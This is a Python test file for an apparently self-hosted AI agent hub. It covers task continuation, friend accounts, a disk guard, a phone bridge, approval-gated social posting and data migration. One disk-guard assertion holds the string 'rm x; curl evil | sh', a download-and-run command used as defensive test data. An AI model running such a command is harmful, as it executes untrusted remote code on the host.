"""Long-run reliability, projects in phases, friend accounts, disk guard, phone bridge, console and migration."""
import asyncio
import base64
import json
import os
from pathlib import Path
import sys
import tempfile
import threading
import re
import time
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "agents"))
sys.path.insert(0, str(ROOT / "tests"))
import store
import workspace as ws
import hub
import sandbox
import cowork
import escalate
import console
import phone_link
import migrate
from openai import AsyncOpenAI
import httpx2 as httpx
from fastapi.testclient import TestClient
from test_cowork import Base, sse, calls

AUTH = {"Authorization": "Bearer " + "k" * 40}


def fake_client(handler):
    return AsyncOpenAI(api_key="t", base_url="https://fake.invalid/v1", http_client=httpx.AsyncClient(transport=httpx.MockTransport(handler)))


class TrimTests(unittest.TestCase):
    def history(self, n, size):
        items = [{"role": "user", "content": "do the thing"}]
        for i in range(n):
            items.append({"type": "function_call", "call_id": f"c{i}", "name": "write_file",
                          "arguments": json.dumps({"path": f"f{i}.md", "content": "x" * size})})
            items.append({"type": "function_call_output", "call_id": f"c{i}", "output": f"out{i} " + "y" * size})
        return items

    def test_small_histories_are_untouched_and_large_ones_fit(self):
        small = self.history(3, 100)
        self.assertIs(cowork.trim_items(small), small)
        big = self.history(40, 12000)
        original = json.dumps(big)
        trimmed = cowork.trim_items(big, soft=120000, hard=260000)
        self.assertEqual(json.dumps(big), original)  # the session's own items are never modified
        self.assertLess(sum(cowork._size(i) for i in trimmed), 130000)
        outputs = [i for i in trimmed if i.get("type") == "function_call_output"]
        self.assertTrue(outputs[0]["output"].startswith("[Older tool result trimmed"))
        self.assertEqual(outputs[-1]["output"], big[-1]["output"])  # the latest result stays whole
        for item in trimmed:
            if item.get("type") == "function_call":
                json.loads(item["arguments"])  # still valid JSON for the chat template
        self.assertEqual(len(trimmed), len(big))

    def test_replayable_drops_unanswered_calls(self):
        items = [{"role": "user", "content": "x"}, {"type": "function_call", "call_id": "a", "name": "n", "arguments": "{}"},
                 {"type": "function_call_output", "call_id": "a", "output": "ok"},
                 {"type": "function_call", "call_id": "b", "name": "n", "arguments": "{}"}]
        self.assertEqual([i.get("call_id") for i in cowork.replayable(items)], [None, "a", "a"])


class ContinuityTests(Base):
    def test_a_stopped_task_is_recapped_for_the_next_one_and_plan_md_is_loaded(self):
        first = ws.create_job("default", "CURRENT REQUEST:\nBuild the site", "cowork", thread="chat-r")
        ws.claim_job()
        import coordination
        coordination.update_plan(first, ["Scaffold", "Pages", "Deploy"], 1, [0])
        ws.event(first, "tool", "Running: npm create vite")
        ws.event(first, "artifact", json.dumps({"id": "a", "name": "index.html"}))
        ws.finish_job(first, "interrupted", error="Task time budget reached.")
        second = ws.create_job("default", "CURRENT REQUEST:\ncontinue", "cowork", thread="chat-r")
        job = ws.claim_job()
        self.assertEqual(job["id"], second)
        text = cowork.recap(job)
        for expected in ("STOPPED BEFORE FINISHING", "Build the site", "[done] Scaffold", "[was in progress] Pages",
                         "npm create vite", "Shared index.html", "Task time budget reached"):
            self.assertIn(expected, text)
        space = sandbox.Workspace("owner", "chat-r").prepare()
        space.write_text("plan.md", "# Plan\n- [x] Phase 1\n- [ ] Phase 2")
        with patch.object(escalate, "available", return_value="off"):
            agent = cowork.build(job, fake_client(lambda r: None), asyncio.Semaphore(1), space)
        self.assertIn("- [ ] Phase 2", agent.instructions)
        self.assertIn("EARLIER WORK TO CONTINUE", agent.instructions)
        # A task after a completed one gets no recap.
        ws.finish_job(second, "completed", "done")
        third = ws.create_job("default", "CURRENT REQUEST:\nnew idea", "cowork", thread="chat-r")
        self.assertEqual(cowork.recap(ws.claim_job()), "")
        ws.finish_job(third, "completed", "ok")

    def test_phases_chain_automatically_and_stop_at_the_limit(self):
        script = [
            calls(("write_file", {"path": "plan.md", "content": "# Plan\n- [x] Phase 1\n- [ ] Phase 2"})),
            calls(("queue_next_phase", {"brief": "Phase 2: write the pages listed in plan.md, then tick it off."})),
            {"role": "assistant", "content": "Phase 1 done."},
        ]

        def handler(request):
            body = json.loads(request.content)
            step = sum(1 for m in body["messages"] if m["role"] == "assistant")
            delta = script[min(step, 2)]
            return sse(delta, "tool_calls" if "tool_calls" in delta else "stop")

        async def scenario():
            ws.create_job("default", "CURRENT REQUEST:\nBig project", "cowork", "fast", thread="chat-ph")
            job = ws.claim_job()
            with patch.object(hub, "async_client", return_value=fake_client(handler)), patch.object(escalate, "available", return_value="off"):
                answer = await cowork.run_job(job)
            ws.finish_job(job["id"], "completed", answer)
            return job, answer
        job, answer = asyncio.run(scenario())
        self.assertEqual(answer, "Phase 1 done.")
        following = ws.query("SELECT * FROM jobs WHERE parent=?", (job["id"],))
        self.assertEqual(len(following), 1)
        self.assertIn("Phase 2: write the pages", following[0]["task"])
        self.assertEqual((following[0]["thread"], following[0]["status"]), ("chat-ph", "queued"))
        client = TestClient(console.create_app("k" * 40, run_worker=False))
        self.assertEqual(client.get(f"/api/jobs/{job['id']}/events", headers=AUTH).json()["next_job"], following[0]["id"])
        with patch.dict(cowork.MAX_CHAIN, owner=1):
            self.assertEqual(cowork.chain_depth(following[0]), 1)

    def test_failed_handoff_stops_the_task_and_reports(self):
        seen = {"after_failure": 0}

        def handler(request):
            body = json.loads(request.content)
            last = body["messages"][-1]
            if last["role"] == "user" and "has to stop now" in str(last["content"]):
                return sse({"role": "assistant", "content": "Report: the scaffold exists; the Claude step failed."}, "stop")
            tools = [m for m in body["messages"] if m["role"] == "tool"]
            if not tools:
                return sse(calls(("ask_claude", {"task": "Refactor everything"})), "tool_calls")
            seen["after_failure"] += 1
            return sse(calls(("list_files", {"path": "."})), "tool_calls")

        async def scenario():
            ws.create_job("default", "CURRENT REQUEST:\nRefactor", "cowork", "fast", allow_frontier=True, thread="chat-h")
            job = ws.claim_job()

            async def failing(kind, space, job_id, task):
                return {"ok": False, "agent": kind, "exit_code": 1, "timed_out": False, "summary": "rate limited"}
            with patch.object(hub, "async_client", return_value=fake_client(handler)), \
                 patch.object(escalate, "available", return_value=None), patch.object(escalate, "run", failing):
                return await cowork.run_job(job)
        answer = asyncio.run(scenario())
        self.assertTrue(answer.startswith("⚠️ **Stopped: the Claude Code hand-off failed"), answer)
        self.assertIn("Report: the scaffold exists", answer)
        self.assertEqual(seen["after_failure"], 0)  # no more model turns after the failure

    def test_time_limit_writes_a_report_instead_of_losing_the_work(self):
        def handler(request):
            body = json.loads(request.content)
            last = body["messages"][-1]
            if last["role"] == "user" and "has to stop now" in str(last["content"]):
                return sse({"role": "assistant", "content": "Report: started the long download."}, "stop")
            return sse(calls(("run_shell", {"command": "sleep 20", "timeout_seconds": 60})), "tool_calls")

        async def scenario():
            ws.create_job("default", "CURRENT REQUEST:\nLong job", "cowork", "fast", thread="chat-t")
            job = ws.claim_job()
            with patch.dict(cowork.PROFILES["fast"], seconds=2), patch.object(hub, "async_client", return_value=fake_client(handler)), \
                 patch.object(escalate, "available", return_value="off"):
                return job, await cowork.run_job(job)
        job, answer = asyncio.run(scenario())
        self.assertIn("Stopped at the 0-minute time limit", answer)
        self.assertIn("Report: started the long download.", answer)
        self.assertTrue(ws.query("SELECT 1 FROM events WHERE job_id=? AND kind='partial'", (job["id"],)))


class AccountTests(Base):
    def test_friends_get_separate_folders_projects_and_old_chats_move_over(self):
        a, b = sandbox.friend_account("A@x.com"), sandbox.friend_account("b@x.com")
        self.assertNotEqual(a, b)
        self.assertEqual(a, sandbox.friend_account("a@x.com "))
        old = sandbox.Workspace("guest", "chat-old").prepare()
        old.write_text("notes.md", "from before")
        client = TestClient(console.create_app("k" * 40, run_worker=False))
        r = client.post("/api/workspace/upload", headers=AUTH, json={"project": "friends", "thread": "chat-old", "name": "x.txt",
                                                                    "content_b64": base64.b64encode(b"hi").decode(), "requested_by": "a@x.com"})
        self.assertEqual(r.status_code, 201, r.text)
        self.assertEqual((sandbox.ROOT / a / "threads" / "chat-old" / "notes.md").read_text(), "from before")
        self.assertFalse((sandbox.ROOT / "guest" / "threads" / "chat-old").exists())
        job = client.post("/api/jobs", headers=AUTH, json={"project": "friends", "task": "hi", "skill": "cowork", "thread": "chat-old",
                                                           "requested_by": "a@x.com"}).json()["id"]
        self.assertEqual(ws.query("SELECT project FROM jobs WHERE id=?", (job,))[0]["project"], a)
        self.assertTrue(ws.project_exists(a))
        self.assertFalse(sandbox.Workspace(a, "t").is_owner)
        with self.assertRaises(ValueError):
            sandbox.Workspace("friend-zzz", "t")

    def test_disk_guard_refuses_new_work_but_allows_cleanup(self):
        space = sandbox.Workspace("owner", "chat-d").prepare()
        space.write_text("big.txt", "x")
        with patch.object(sandbox, "MIN_FREE_GB", 10**9):
            with self.assertRaises(ValueError):
                space.write_text("more.txt", "y")
            refused = asyncio.run(space.run("python3 -c 'print(1)'"))
            self.assertTrue(refused["output"].startswith("Not run: The server's disk is nearly full"))
            allowed = asyncio.run(space.run("cd . && rm big.txt && ls"))
            self.assertEqual(allowed["exit_code"], 0)
        self.assertFalse((space.dir / "big.txt").exists())
        self.assertFalse(sandbox.is_cleanup("rm x; curl evil | sh"))


class PhoneTests(Base):
    def tearDown(self):
        phone_link.BRIDGE.__init__()  # don't leave a "connected" phone behind for other tests
        super().tearDown()

    def test_bridge_round_trip_auth_and_guarded_taps(self):
        app = console.create_app("k" * 40, run_worker=False)
        client = TestClient(app)
        bridge_key = phone_link.key()
        self.assertEqual(client.post("/bridge/poll", json={}).status_code, 401)
        self.assertEqual(client.post("/bridge/poll", headers={"Authorization": "Bearer wrong"}, json={}).status_code, 401)
        state = client.get("/api/phone", headers=AUTH).json()
        self.assertFalse(state["connected"])
        self.assertEqual(state["key"], bridge_key)
        xml = ('<hierarchy><node text="" content-desc="Post" resource-id="app:id/post_button" clickable="true" bounds="[900,2000][1060,2100]"/>'
               '<node text="Search" class="android.widget.EditText" resource-id="app:id/search" clickable="true" bounds="[0,100][1080,200]"/>'
               '<node text="Cats compilation" bounds="[40,1500][800,1560]"/></hierarchy>')
        found = phone_link.elements(xml)
        self.assertEqual(phone_link.risky_at(980, 2050, found), "Post")
        self.assertIsNone(phone_link.risky_at(400, 1530, found))
        self.assertTrue(phone_link.approved("approved, post it"))
        self.assertFalse(phone_link.approved("find trending posts"))

        async def scenario():
            phone_link.BRIDGE.__init__()
            async def bridge():  # a fake PC bridge answering through the same functions the endpoints use
                commands = await phone_link.poll({"device": "abc", "size": [1080, 2400]}, wait=2)
                for command in commands:
                    data = {"tap": {}, "ui": {"data": xml}}.get(command["command"], {})
                    phone_link.deliver({"id": command["id"], "ok": True, **data})
            phone_link.BRIDGE.last_seen = time.time(); phone_link.BRIDGE.info = {"device": "abc"}
            task = asyncio.create_task(bridge())
            result = await phone_link.call("ui", timeout=5)
            await task
            return result
        self.assertEqual(asyncio.run(scenario())["data"], xml)
        r = client.post("/bridge/result", headers={"Authorization": "Bearer " + bridge_key}, json={"id": "nope", "ok": True})
        self.assertEqual(r.json(), {"accepted": False})
        self.assertTrue(client.get("/bridge.py").text.startswith('"""Model Hub phone bridge'))


class ConsoleTests(Base):
    def test_chats_health_memory_edit_and_delete(self):
        client = TestClient(console.create_app("k" * 40, run_worker=False))
        space = sandbox.Workspace("owner", "chat-c").prepare()
        space.write_text("report.md", "# hi")
        job = ws.create_job("default", "CURRENT REQUEST:\nWrite a report", "cowork", thread="chat-c", requested_by="me@x.com")
        chats = client.get("/api/chats", headers=AUTH).json()
        row = next(c for c in chats["chats"] if c["thread"] == "chat-c")
        self.assertEqual((row["account"], row["last_request"], row["tasks"]), ("owner", "Write a report", 1))
        r = client.post("/api/chats/delete", headers=AUTH, json={"account": "owner", "thread": "chat-c"})
        self.assertEqual(r.status_code, 400)  # a queued task still uses it
        ws.cancel_job(job)
        self.assertTrue(client.post("/api/chats/delete", headers=AUTH, json={"account": "owner", "thread": "chat-c"}).json()["deleted"])
        self.assertFalse(space.dir.exists())
        health = client.get("/api/health", headers=AUTH).json()
        self.assertIn("chats", health["disks"])
        note = ws.save_note("default", "Tone", "casual", "preference")
        self.assertTrue(client.post(f"/api/memories/{note}", headers=AUTH, json={"title": "Tone", "content": "formal", "kind": "preference"}).json()["updated"])
        self.assertEqual(ws.memories("default")[0]["content"], "formal")
        self.assertEqual(client.get("/api/thread/active", headers=AUTH, params={"project": "default", "thread": "chat-c"}).json(), {"job": None})


class PipeRetryTests(Base):
    def test_pipe_survives_controller_hiccups_and_reattaches_with_status(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("cowork_pipe2", ROOT / "integrations" / "openwebui_cowork.py")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        app = console.create_app("k" * 40, run_worker=False)
        pipe = module.Pipe()
        pipe.valves.OWNER_KEY = "k" * 40
        pipe._client = lambda: httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver", headers=AUTH)
        real_call, failures = pipe._call, {"n": 0}

        async def flaky(client, method, path, **kw):
            if "/events" in path and failures["n"] < 3:
                failures["n"] += 1
                raise httpx.ConnectError("controller restarting")
            return await real_call(client, method, path, **kw)
        pipe._call = flaky
        job = ws.create_job("default", "CURRENT REQUEST:\nwork", "cowork", thread="chat-s")
        ws.claim_job()

        async def run():
            statuses, chunks = [], []
            async def emit(event): statuses.append(event["data"]["description"])
            async def finish():
                await asyncio.sleep(0.3)
                ws.finish_job(job, "completed", "All done.")
            waiter = asyncio.create_task(finish())
            with patch.object(asyncio, "sleep", wraps=asyncio.sleep) as _:
                async for chunk in pipe.pipe({"messages": [{"role": "user", "content": "status"}]},
                                             __user__={"role": "admin", "email": "me@x.com", "id": "u"},
                                             __metadata__={"chat_id": "chat-s"}, __event_emitter__=emit):
                    chunks.append(chunk)
            await waiter
            return "".join(chunks), statuses
        reply, statuses = asyncio.run(run())
        self.assertIn("All done.", reply)
        self.assertIn("Reconnecting to the agent controller… (the task keeps running)", statuses)
        self.assertEqual(failures["n"], 3)


class MigrateTests(unittest.TestCase):
    def test_data_moves_encrypted_and_intact(self):
        import sqlite3
        tmp = Path(tempfile.mkdtemp())
        src = tmp / "old"
        (src / "data" / "open-webui").mkdir(parents=True)
        (src / "cowork" / "owner" / "threads" / "c1").mkdir(parents=True)
        db = sqlite3.connect(src / "data" / "open-webui" / "webui.db")
        db.execute("create table t(x)"); db.execute("insert into t values ('hello')"); db.commit()
        (src / "data" / "hub-code").mkdir(); (src / "data" / "hub-code" / "x").write_text("not copied")
        (src / "cowork" / "owner" / "threads" / "c1" / "report.md").write_text("# r")
        dst = tmp / "new"
        port = 19100 + os.getpid() % 500
        threading.Thread(target=migrate.receive, args=(port, "k" * 40, dst / "data", dst / "cowork"), daemon=True).start()
        time.sleep(0.5)
        with patch.object(migrate, "default_sources", return_value=[(src / "data", "data"), (src / "cowork", "cowork")]):
            migrate.start_send(f"http://127.0.0.1:{port}", "k" * 40)
            for _ in range(100):
                time.sleep(0.1)
                if migrate.SEND["state"] != "sending":
                    break
        self.assertEqual(migrate.SEND["state"], "done", migrate.SEND)
        self.assertEqual(sqlite3.connect(dst / "data" / "open-webui" / "webui.db").execute("select x from t").fetchall(), [("hello",)])
        self.assertEqual((dst / "cowork" / "owner" / "threads" / "c1" / "report.md").read_text(), "# r")
        self.assertFalse((dst / "data" / "hub-code").exists())
        self.assertTrue((dst / "data" / ".restored").exists())


if __name__ == "__main__":
    unittest.main()


class GpuSplitTests(Base):
    def test_leads_alternate_gpus_and_helpers_use_the_other_one(self):
        self.assertEqual(cowork.assign_gpus("a"), ("qwen-1", "qwen-2"))
        self.assertEqual(cowork.assign_gpus("b"), ("qwen-2", "qwen-1"))
        cowork.release_gpus("a")
        self.assertEqual(cowork.assign_gpus("c"), ("qwen-1", "qwen-2"))

    def test_routine_steps_think_less(self):
        read = [{"role": "user", "content": "x"}, {"type": "function_call", "call_id": "1", "name": "read_file", "arguments": "{}"},
                {"type": "function_call_output", "call_id": "1", "output": "file text"}]
        self.assertEqual(cowork.effort_for(read, "medium"), "low")
        self.assertEqual(cowork.effort_for(read[:1], "medium"), "medium")  # planning
        shell = [{"type": "function_call", "call_id": "2", "name": "run_shell", "arguments": "{}"},
                 {"type": "function_call_output", "call_id": "2", "output": "Exit code 1\nTraceback"}]
        self.assertEqual(cowork.effort_for(shell, "medium"), "medium")
        failed_read = read[:2] + [{"type": "function_call_output", "call_id": "1", "output": "An error occurred: no such file"}]
        self.assertEqual(cowork.effort_for(failed_read, "medium"), "medium")

    def test_delegate_many_runs_helpers_in_parallel_on_both_gpus(self):
        seen, active, peak = [], {"n": 0}, {"n": 0}
        script = [calls(("delegate_many", {"briefs": ["Write a.md about apples", "Write b.md about bananas", "Write c.md about cherries"]})),
                  {"role": "assistant", "content": "All three written."}]

        async def handler(request):
            body = json.loads(request.content)
            if body["messages"][0]["content"].startswith("You are a helper agent"):
                seen.append(body["model"])
                active["n"] += 1
                peak["n"] = max(peak["n"], active["n"])
                await asyncio.sleep(0.2)
                active["n"] -= 1
                return sse({"role": "assistant", "content": "done " + body["messages"][-1]["content"][:12]}, "stop")
            step = sum(1 for m in body["messages"] if m["role"] == "assistant")
            delta = script[min(step, 1)]
            efforts.append(body.get("reasoning_effort"))
            return sse(delta, "tool_calls" if "tool_calls" in delta else "stop")
        efforts = []

        async def scenario():
            ws.create_job("default", "CURRENT REQUEST:\nfruit", "cowork", "balanced", thread="chat-g")
            job = ws.claim_job()
            with patch.object(hub, "async_client", return_value=fake_client(handler)), patch.object(escalate, "available", return_value="off"):
                return await cowork.run_job(job, asyncio.Semaphore(6))
        self.assertEqual(asyncio.run(scenario()), "All three written.")
        self.assertEqual(sorted(seen), ["qwen-1", "qwen-2", "qwen-2"])
        self.assertGreaterEqual(peak["n"], 2)
        self.assertEqual(cowork._leads, {})  # released when the task ended
        self.assertEqual(efforts[0], "medium")


class ResearchToolTests(Base):
    def test_connect_parsing_storage_and_secrecy(self):
        import toolbox
        values = toolbox.parse_connect("x", ["myname", "auth_token=abc", "ct0=def"])
        self.assertEqual(values, {"auth_token": "abc", "ct0": "def", "username": "myname"})
        with self.assertRaises(ValueError):
            toolbox.save_credentials("x", {"username": "me"})
        state = toolbox.save_credentials("x", values)
        self.assertTrue(state["x"]["connected"])
        self.assertEqual(oct((store.DATA / "social.json").stat().st_mode & 0o777), "0o600")
        self.assertEqual(toolbox.social_env()["AUTH_TOKEN"], "abc")
        self.assertFalse(toolbox.forget("x")["x"]["connected"])
        client = TestClient(console.create_app("k" * 40, run_worker=False))
        r = client.post("/api/connections/social", headers=AUTH, json={"service": "bluesky", "words": ["me.bsky.social", "pw-1"]})
        self.assertTrue(r.json()["accounts"]["bluesky"]["connected"], r.text)
        self.assertIn("help", client.get("/api/connections/social", headers=AUTH).json())

    def test_posts_need_the_users_approval_of_that_draft(self):
        import research_tools
        self.assertTrue(research_tools.approved_post("approve post 7", 7))
        self.assertTrue(research_tools.approved_post("ok, approved — post 12 go", 12))
        self.assertFalse(research_tools.approved_post("approve post 17", 7))
        self.assertFalse(research_tools.approved_post("draft a post about 7 hooks", 7))

        space = sandbox.Workspace("owner", "chat-post").prepare()
        space.write_text("caption.txt", "x")
        job = {"id": "j" * 32, "project": "default", "profile": "fast", "allow_frontier": 0, "allow_images": 0,
               "thread": "chat-post", "task": "CURRENT REQUEST:\nmake a post"}
        ws.create_job("default", "x", "cowork", thread="chat-post")
        calls_made = []

        async def fake_social(command, args, timeout=240):
            calls_made.append((command, args))
            return {"ok": True, "id": "1", "url": "https://x.com/me/status/1"}

        class Budget:
            def active(self): pass
            def before(self, name): pass

        def tools_for(request):
            tools, _ = research_tools.build_tools({**job, "task": "CURRENT REQUEST:\n" + request}, space, None, asyncio.Semaphore(1),
                                                  lambda *a: None, Budget(), request, "qwen-2")
            return {t.name: t for t in tools}

        async def invoke(tool, args):
            from agents.tool_context import ToolContext
            ctx = ToolContext(context=None, tool_name=tool.name, tool_call_id="c1", tool_arguments=json.dumps(args))
            return await tool.on_invoke_tool(ctx, json.dumps(args))

        tools = tools_for("make a post")
        self.assertTrue({"analyze_video", "trend_research", "x_search", "draft_post", "publish_post"} <= set(tools))
        reply = asyncio.run(invoke(tools["draft_post"], {"platform": "x", "caption": "hello world"}))
        post_id = int(re.search(r"#(\d+)", reply).group(1))
        with patch.object(research_tools.toolbox, "run_social", fake_social):
            refused = asyncio.run(invoke(tools["publish_post"], {"post_id": post_id}))
            self.assertIn("Not approved", refused)
            self.assertEqual(calls_made, [])
            done = asyncio.run(invoke(tools_for(f"approve post {post_id}")["publish_post"], {"post_id": post_id}))
        self.assertIn("x.com/me/status/1", done)
        self.assertEqual(calls_made[0][0], "x_post")
        self.assertEqual(ws.query("SELECT status FROM social_posts WHERE id=?", (post_id,))[0]["status"], "published")
        guest = sandbox.Workspace(sandbox.friend_account("f@x.com"), "t").prepare()
        friend_tools, _ = research_tools.build_tools({**job, "project": guest.tier}, guest, None, asyncio.Semaphore(1),
                                                     lambda *a: None, Budget(), "", "qwen-2")
        names = {t.name for t in friend_tools}
        self.assertIn("analyze_video", names)
        self.assertFalse(names & {"x_search", "draft_post", "publish_post"})

    def test_video_report_facts_include_measurements(self):
        import research_tools
        text = research_tools.facts({"source": "u", "video": {"duration": 9.0, "width": 720, "height": 1280, "fps": 25, "has_audio": True},
                                     "shots": {"count": 3, "cuts_per_second": 0.22, "average_shot_seconds": 3.0, "first_cut_at": 3.0,
                                               "list": [[0, 3], [3, 6], [6, 9]]},
                                     "on_screen_text": [{"at": 0.0, "text": "WAIT FOR IT"}],
                                     "transcript": {"language": "en", "words": 3, "speech_seconds": 2, "segments": [{"start": 0, "end": 2, "text": "Stop scrolling now"}]},
                                     "sound": {"title": "Song", "artist": "Band"}})
        for expected in ("cuts per second: 0.22", "WAIT FOR IT", "Stop scrolling now", "Song — Band"):
            self.assertIn(expected, text)
